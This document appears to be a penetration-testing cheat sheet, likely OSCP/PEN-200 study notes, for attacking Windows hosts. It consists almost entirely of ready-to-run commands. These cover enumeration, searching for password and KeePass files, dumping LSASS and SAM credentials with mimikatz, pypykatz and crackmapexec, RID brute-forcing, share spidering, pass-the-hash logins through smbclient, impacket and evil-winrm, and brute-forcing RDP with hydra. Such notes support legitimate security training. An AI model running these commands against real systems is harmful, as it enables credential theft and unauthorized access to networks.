Port scan for Win:

```bash
nmap -sC -sV -A -Pn -p 53,88,135,139,445 $TARGET_IP -vv
```
OSCP guidance for enumeration:
---
#oscp #windows-enum #pen-200
```powershell
whoami /groups
(Get-PSReadlineOption).HistorySavePath
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember "$GROUP"
systeminfo
ipconfig /all
route print
netstat -ano
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-Process # or tasklist /SVC
Get-Process | findstr /V /R "svchost winlogon vm3dservice RuntimeBroker vmtoolsd SearchHost lsass"
```

```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\$USER\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
net user $USER
runas /user:$USER cmd
```

Check OS architecture / version:
```powershell
ver
wmic os get osarchitecture
hostname
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

Get OS patches:
```powershell
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

Get OS drives:
```powershell
wmic logicaldisk get caption,description,providername
```
Get network adapters and open ports:
```powershell
ipconfig /all
netstat -ano
```

Get routes:
```powershell
route PRINT
```

Get running processes:

```powershell
tasklist /SVC
```

Get installed patches:

```powershell
wmic qfe
```

Search for cleartext passwords:
```powershell
findstr /si password *.txt
findstr /spin "password" *.*
```

Dump LSASS:
check for #SEDebugPrivilige
```powershell
whoami /priv
#run mimikatz
```

```bash
crackmapexec smb $TARGET_IP -u $USER -p $PASSWORD -M minidump
pypykatz lsa minidump lsass.DMP
```

Add domain NB name to /etc/hosts

```bash
crackmapexec smb $TARGET_IP -u '' -p ''
```

check for open shares

```bash
crackmapexec smb $TARGET_IP -u '' -p '' --shares
```

Enumerate users by brute forcing RID
#rid #bruteforce-rid

```shell
crackmapexec smb $AD_DOMAIN -u $USER -p '' --rid-brute 10000
#extract usernames
crackmapexec smb $AD_DOMAIN -u $USER -p '' --rid-brute 10000 | grep -o '\\[^ ]*' | awk -F'\\' '{print $2}' | uniq
```

Show all files and DIRs for guest:

```shell
crackmapexec smb $TARGET_IP -u 'guest' -p '' -M spider_plus
```

```shell
crackmapexec smb $TARGET_IP -u $USER -p $PASSWORD -M spider_plus --spider users
```

Parse the JSON from the previous cmd into readable form:

```shell
cat $TARGET_IP.json | jq '. |map_values(keys)'
```

Mount windows share:
```bash
sudo mount -o username=$USER,password=$PASSWORD -t cifs \\\\$TARGET_IP\$SHARE /mnt
```

wmiexec with hash:
#pass-the-hash #pth 
```bash
crackmapexec smb -u administrator -H $HASH -X "powershell -e ..."
```
smbclient:
#pass-the-hash 
```bash
smbclient \\\\$TARGET_IP\\$SHARE -U Administrator --pw-nt-hash $HASH
```

Try to connect to console:

```shell
impacket-psexec $USER:$PASSWORD@$TARGET_IP
```

```bash
impacket-wmiexec -hashes :$NTLM$ Administrator@$TARGET_IP
```

```shell
evil-winrm -i $TARGET_IP -u administrator -p $PASSWORD
```

```shell
evil-winrm -i $TARGET_IP -u administrator -H $HASH
```

```sh
crackmapexec winrm $TARGET_IP -u $USER -p $PASSWORD
```


Port 3389 RDP with clipboard enabled:

```bash
xfreerdp +clipboard /v:$TARGET_IP /u:$USER /cert:ignore
```

Connect with shared folder, and NLA :
```bash
xfreerdp +clipboard /v:$TARGET_IP /sec:nla /u:$USER /p:$PASSWORD  /cert:ignore /drive:shared,/home/kali/shared
```

Brute force RDP:

```bash
hydra -L /usr/share/wordlists/dirb/others/names.txt -p $PASSWORD rdp://$TARGET_IP -I
```

Check FS for keepass files:

```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```


mimikatz dump as local admin:
#dump #mimikatz
```powershell
.\mimikatz
privilege::debug
token::elevate
lsadump::sam
```